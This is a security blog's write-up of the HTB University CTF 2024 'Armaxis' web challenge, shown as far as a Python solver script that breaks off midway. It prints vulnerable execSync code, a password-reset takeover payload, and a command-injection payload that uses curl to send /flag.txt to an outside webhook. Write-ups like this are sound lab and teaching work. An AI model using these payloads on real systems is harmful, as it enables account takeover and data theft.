<!DOCTYPE html>
<html lang="en">
    <!-- title -->
<!-- keywords -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="DJumanto">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="DJumanto">
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,write-up">
    <meta name="description" content="">
    <meta name="description" content="Write Up By Heroes Cyber Security  Upon playing with Heroes Cyber Security, we managed to solve 3&#x2F;4 web exploitation problem and secure 16th position in the leaderboard. Index Web Armaxis Web B">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB University CTF 2024">
<meta property="og:url" content="http://example.com/2025/12/11/ctf/web/HTBUNIVCTF2024/index.html">
<meta property="og:site_name" content="DJumanto Sec Blog">
<meta property="og:description" content="Write Up By Heroes Cyber Security  Upon playing with Heroes Cyber Security, we managed to solve 3&#x2F;4 web exploitation problem and secure 16th position in the leaderboard. Index Web Armaxis Web B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/e4ojfv2PZEZDSPUTlsDZekbXk06ICAXjrcSji4Sa.jpg">
<meta property="og:image" content="https://hackmd.io/_uploads/HJAIoEJHJl.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HkV4telBJe.png">
<meta property="og:image" content="https://hackmd.io/_uploads/HyDhOMeSye.png">
<meta property="og:image" content="https://hackmd.io/_uploads/SJTC_GxHJl.png">
<meta property="article:published_time" content="2025-12-11T15:47:49.000Z">
<meta property="article:modified_time" content="2025-12-11T15:50:45.493Z">
<meta property="article:author" content="DJumanto">
<meta property="article:tag" content="BROKEN ACCESS CONTROL">
<meta property="article:tag" content="COMMAND INJECTION">
<meta property="article:tag" content="JWT">
<meta property="article:tag" content="PROTOTYPE POLLUTION">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/e4ojfv2PZEZDSPUTlsDZekbXk06ICAXjrcSji4Sa.jpg">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    <title>HTB University CTF 2024 · DJumanto Sec Blog</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .footer-fixed-btn,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(
            -45deg,
            #444 0,
            #444 80px,
            #333 80px,
            #333 160px
        );
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    <!-- 百度统计  -->
    <!-- 谷歌统计  -->
    <!-- Google tag (gtag.js) -->
<meta name="generator" content="Hexo 8.1.1"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
        <body class="post-body">
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        <div class="header-sidebar-menu">
            <div style="padding-left: 1px;">&#xe775;</div>
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href="/">DJumanto Sec Blog</a>
        </span>
    </div>
    <!-- toggle banner -->
    <div class="banner">
        <div class="blog-title header-element">
            <a href="/">DJumanto Sec Blog</a>
        </div>
        <div class="post-title header-element">
            <a href="#" class="post-name">HTB University CTF 2024</a>
        </div>
    </div>
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- donate button -->

    <!-- back to top button -->
    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
        <div>&#xe639;</div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="    height:50vh;
">
    <!-- 主页  -->
    <!-- 404页  -->
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
                HTB University CTF 2024
            <!-- 404 -->
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            <!-- 404 -->
        </p>
        <!-- 文章页 meta -->
            <div class="post-intros">
                <!-- 文章页标签  -->
                    <div class="post-intro-tags" >
        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
        <a class="post-tag" href="javascript:void(0);" data-tags="BROKEN ACCESS CONTROL">BROKEN ACCESS CONTROL</a>
        <a class="post-tag" href="javascript:void(0);" data-tags="JWT">JWT</a>
        <a class="post-tag" href="javascript:void(0);" data-tags="PROTOTYPE POLLUTION">PROTOTYPE POLLUTION</a>
        <a class="post-tag" href="javascript:void(0);" data-tags="COMMAND INJECTION">COMMAND INJECTION</a>
</div>

                <!-- 文章字数统计 -->
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">5.4k</span>Reading time: <span class="post-count reading-time">34 min</span></span>
                    </div>
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2025/12/11</span>
                    <!-- busuanzi -->
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <p><img src="https://s3.eu-central-1.amazonaws.com/htb-ctf-prod-public-storage/ctf/banners/e4ojfv2PZEZDSPUTlsDZekbXk06ICAXjrcSji4Sa.jpg" alt="image"></p>
<blockquote>
<p>Write Up By Heroes Cyber Security</p>
</blockquote>
<p>Upon playing with Heroes Cyber Security, we managed to solve 3&#x2F;4 web exploitation problem and secure 16th position in the leaderboard.</p>
<h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><ul>
<li><a href="#Web-Armaxis">Web Armaxis</a></li>
<li><a href="#Web-Breaking-Bank">Web Breaking Bank</a></li>
<li><a href="#Web-Intergalactic-Bounty">Web Intergalactic Bounty</a></li>
</ul>
<h2 id="Web-Armaxis"><a href="#Web-Armaxis" class="headerlink" title="Web Armaxis"></a>Web Armaxis</h2><blockquote>
<p>Difficulity: <strong>Very Easy</strong></p>
</blockquote>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><ul>
<li>Broken Logic in Reset Password Functionality</li>
<li>Command Injection</li>
</ul>
<h3 id="Challenge-Information"><a href="#Challenge-Information" class="headerlink" title="Challenge Information"></a>Challenge Information</h3><p>Given a web challenge with these functionality:</p>
<ul>
<li>Basic Auth</li>
<li>Reset Password</li>
<li>Dispatch Weapon</li>
</ul>
<p>The task is pretty straightforward, in dispatch weapon functionality, we can insert a description of our weapons in markdown format which will be rendered in server side via <code>parseMarkdown</code> Function in markdown.js. We can also insert image in format <code>![alt](url)</code> which will be curled from using dangerous function <code>execSync</code> which is an os exec command in js.</p>
<p>below is the route and the endpoint of weapon dispatch the markdown.js which has the command injection vulnerability:</p>
<p>&#x2F;weapon&#x2F;dispatch</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/weapons/dispatch&quot;</span>, authenticate, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; role &#125; = req.<span class="property">user</span>;</span><br><span class="line">  <span class="keyword">if</span> (role !== <span class="string">&quot;admin&quot;</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;Access denied.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; name, price, note, dispatched_to &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (!name || !price || !note || !dispatched_to) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;All fields are required.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedNote = <span class="title function_">parseMarkdown</span>(note);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">dispatchWeapon</span>(name, price, parsedNote, dispatched_to);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;Weapon dispatched successfully.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error dispatching weapon:&quot;</span>, err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Error dispatching weapon.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>markdown.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MarkdownIt</span> = <span class="built_in">require</span>(<span class="string">&#x27;markdown-it&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; execSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> md = <span class="keyword">new</span> <span class="title class_">MarkdownIt</span>(&#123;</span><br><span class="line">    <span class="attr">html</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseMarkdown</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!content) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> md.<span class="title function_">render</span>(</span><br><span class="line">        content.<span class="title function_">replace</span>(<span class="regexp">/\!\[.*?\]\((.*?)\)/g</span>, <span class="function">(<span class="params">match, url</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> fileContent = <span class="title function_">execSync</span>(<span class="string">`curl -s <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">const</span> base64Content = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(fileContent).<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">`&lt;img src=&quot;data:image/*;base64,<span class="subst">$&#123;base64Content&#125;</span>&quot; alt=&quot;Embedded Image&quot;&gt;`</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error fetching image from URL <span class="subst">$&#123;url&#125;</span>:`</span>, err.<span class="property">message</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">`&lt;p&gt;Error loading image: <span class="subst">$&#123;url&#125;</span>&lt;/p&gt;`</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; parseMarkdown &#125;;</span><br></pre></td></tr></table></figure>

<p>But to access that endpoint, we have to become an admin. <em>How do we do that?</em></p>
<h3 id="Admin-Account-Takeover"><a href="#Admin-Account-Takeover" class="headerlink" title="Admin Account Takeover"></a>Admin Account Takeover</h3><p>Remember that this application has reset password functionality? the logic for reset password will be described below:</p>
<ol>
<li>Active user request reset password token to <code>/reset-password/request</code></li>
<li>Token sent into requesting user email</li>
<li>User submit the token, email, and new password to <code>/reset-password/</code></li>
</ol>
<p>In the point number 3, user has to supply the target email for password reset. Fortunately, there’s no integrity checking that the supplied email is the current user email. Which in this case, we can supplied with admin privileged email and change it’s password. below is the code for password reset:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/reset-password&quot;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; token, newPassword, email &#125; = req.<span class="property">body</span>; <span class="comment">// Added &#x27;email&#x27; parameter</span></span><br><span class="line">  <span class="keyword">if</span> (!token || !newPassword || !email)</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Token, email, and new password are required.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> reset = <span class="keyword">await</span> <span class="title function_">getPasswordReset</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (!reset) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid or expired token.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title function_">getUserByEmail</span>(email);</span><br><span class="line">    <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;User not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">updateUserPassword</span>(user.<span class="property">id</span>, newPassword);</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">deletePasswordReset</span>(token);</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;Password reset successful.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error resetting password:&quot;</span>, err);</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Error resetting password.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>we can use this payload to exploit the vuln:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;19c1b2cf4fbb2f19948bba32b40b7f95&quot;, </span><br><span class="line">    &quot;newPassword&quot;: &quot;aa&quot;, </span><br><span class="line">    &quot;email&quot;: &quot;admin@armaxis.htb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>Now we have admin token which now we able to hit the <code>/weapon/dispatch</code> endpoint. To exploit the remote code execution, we can utilize the command injection vulnerability within the url that being parsed with MarkdownIt. we can use this payload to exploit it:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;gedagedigedagedao&quot;,</span><br><span class="line">    &quot;price&quot;: 100.97, </span><br><span class="line">    &quot;note&quot;: &quot;![INJECTED](https://google.com ; curl -X POST -d @/flag.txt webhook_url)&quot;, </span><br><span class="line">    &quot;dispatched_to&quot;: &quot;mariaban&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>which will be parsed, and send into <code>execSync</code> function:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fileContent = <span class="title function_">execSync</span>(<span class="string">`curl -s https://google.com ; curl -X POST -d @/flag.txt webhook_urlhttps://google.com ; curl -X POST -d @/flag.txt webhook_url`</span>);</span><br></pre></td></tr></table></figure>

<p>webhook log:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: qdiyqxfhpgectiqifhius4f88b183wnvt.oast.fun</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 26</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: curl/8.11.1</span><br><span class="line"></span><br><span class="line">HTB&#123;FAKE_FLAG_FOR_TESTING&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Full-Solver"><a href="#Full-Solver" class="headerlink" title="Full Solver"></a>Full Solver</h3><p>Below is the full solver:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">API</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, webhook</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="variable language_">self</span>.c = httpx.Client()</span><br><span class="line">        <span class="variable language_">self</span>.adminEmail = <span class="string">&quot;admin@armaxis.htb&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.webhook = webhook</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">self</span>):</span><br><span class="line">        info = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;test@email.htb&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">        resp = <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/register&quot;</span>, json=info).text</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resetPasswordRequest</span>(<span class="params">self,</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.c.post(<span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>/reset-password/request&quot;</span>, json=&#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;test@email.htb&quot;</span>&#125;).text</span><br><span 